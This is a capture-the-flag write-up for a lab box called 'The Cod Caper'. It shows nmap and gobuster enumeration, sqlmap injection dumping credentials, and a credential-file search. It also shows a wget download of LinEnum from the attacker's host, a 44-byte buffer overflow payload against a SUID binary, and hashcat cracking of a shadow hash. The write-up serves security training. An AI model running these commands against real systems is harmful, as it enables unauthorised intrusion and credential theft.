# Room/The-Cod-Caper

# Enumeration

## nmap Scan

- As always, this phase is so important to know more about our target! getting to know the open ports and which services running on those ports!

```sh
nmap -sV -sC -p- -T4 -vv -oG nmap 10.10.131.81
```

```sh
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDs2k31WKwi9eUwlvpMuWNMzFjChpDu4IcM3k6VLyq3IEnYuZl2lL/dMWVGCKPfnJ1yv2IZVk1KXha7nSIR4yxExRDx7Ybi7ryLUP/XTrLtBwdtJZB7k48EuS8okvYLk4ppG1MRvrVojNPprF4nh5S0EEOowqGoiHUnGWOzYSgvaLAgvr7ivZxSsFCLqvdmieErVrczCBOqDOcPH9ZD/q6WalyHMccZWVL3Gk5NmHPaYDd9ozVHCMHLq7brYxKrUcoOtDhX7btNamf+PxdH5I9opt6aLCjTTLsBPO2v5qZYPm1Rod64nysurgnEKe+e4ZNbsCvTc1AaYKVC+oguSNmT
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAmpmAEGyFxyUqlKmlCnCeQW4KXOpnSG6SwmjD5tGSoYaz5Fh1SFMNP0/KNZUStQK9KJmz1vLeKI03nLjIR1sho=
|   256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBIRpiANvrp1KboZ6vAeOeYL68yOjT0wbxgiavv10kC
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=12/17%OT=22%CT=1%CU=40173%PV=Y%DS=2%DC=I%G=Y%TM=61BCFE
OS:96%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=105%TI=Z%CI=I%II=I%TS=8)SE
OS:Q(SP=102%GCD=1%ISR=105%TI=Z%II=I%TS=8)OPS(O1=M505ST11NW6%O2=M505ST11NW6%
OS:O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)WIN(W1=68DF%W2
OS:=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNS
OS:NW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

```

## Webserver Host Discovery

```sh
 gobuster dir -u 10.10.131.81 -w /usr/share/seclists/Discovery/Web-Content/big.txt  -o dirbuster.txt -x php,txt -q 
```
- q: for Quiet! Don't want to show any warnings!

```sh
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/administrator.php    (Status: 200) [Size: 409]
```

## Web Exploitalation - SQL INjection

It seems the Username input is vulnerable to SQL injection! Now the time to fire up ```sqlmap```

```sh
sqlmap http://10.10.131.81/administrator.php --forms POST --dump
```

The result

![****](/The-Cod-Caper/Screenshots/sqlmap.png)

## Command Execution

- After logging with the credentials we find! it looks like we can run shell commands!

![****](/The-Cod-Caper/Screenshots/os.png)

Time for some shell!

![****](/The-Cod-Caper/Screenshots/shell.png)

- Seaching for the SSH password!

```sh
find / -type f -name *pass* -exec ls -la {} \; 2>/dev/null
```

```sh
-rw-r--r-- 1 www-data www-data 12 Jan 15  2020 /var/hidden/pass
```

Is Interesting! let's read it!

## LinEnum

```sh
python3 -m http.server
```

```
wget 10.X.X.X:8000/LinEnum.sh
```

![****](/The-Cod-Caper/Screenshots/line.png)

Making the File Executable!!

```sh
chmod u+x LinENum.sh
```

Analysing the results, Interesting files! ```SUID```

```sh
[-] SUID files:
-r-sr-xr-x 1 root papa 7516 Jan 16  2020 /opt/secret/root
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 10624 May  8  2018 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
```

## Buffer Overflow

Running ```cyclic -l 0x6161616c``` outputs ``44``, meaning we can overwrite EIP once we provide 44 characters of input.

```sh
python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
```

## Bruteforcing the hash!

After getting the hash!

```sh
$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.
```

We're bruteforcing it using ```hashcat```

```sh
hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt
```

The result

![****](/The-Cod-Caper/Screenshots/hashcat.png)


Thank you!